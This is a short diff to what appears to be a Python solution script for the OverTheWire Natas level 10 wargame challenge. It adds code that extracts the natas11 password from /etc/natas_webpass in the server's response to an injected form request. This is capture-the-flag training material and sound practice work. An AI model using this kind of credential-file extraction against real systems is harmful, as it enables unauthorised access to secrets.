@@ -47,4 +47,8 @@ data = {
 }
 response = session.post(URL, data=data)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.div
-print(f'{div_content}')
+print(f'{div_content}\n')
+
+
+password = re.search(r'/etc/natas_webpass/natas11:(\w+)', str(div_content)).group(1)
+print(f'natas11 password: {password}')
